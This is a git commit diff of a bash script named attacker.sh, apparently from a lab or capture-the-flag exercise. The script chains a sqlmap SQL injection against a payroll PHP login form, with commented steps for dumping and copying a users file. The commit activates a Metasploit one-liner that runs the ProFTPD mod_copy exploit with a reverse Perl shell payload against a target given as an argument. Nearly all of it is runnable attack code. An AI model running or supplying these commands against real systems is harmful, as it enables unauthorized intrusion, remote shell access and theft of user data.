01a027efe3178e177531f622d97991b614b15ab6
root <root@localhost.localdomain>
2020-02-17 02:28:14 +0000

    started sql injection

--- attacker.sh
+++ attacker.sh
@@ -1,12 +1,11 @@
 #!/bin/bash
 
+TARGET=$1
 
-
-TARGET = $1
-
-sqlmap -u http://192.168.0.32/payroll_app.php --data="user=admin&password=admin&s=OK" --sqlmap-shell 
+#sqlmap -u http://192.168.0.32/payroll_app.php --data="user=admin&password=admin&s=OK" --sqlmap-shell
+#--dump 
 
 # mv ~/.sqlmap/output/192.168.0.32/dump/payroll/users.csv ~/
 
-# msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run;"
+msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run;"
 
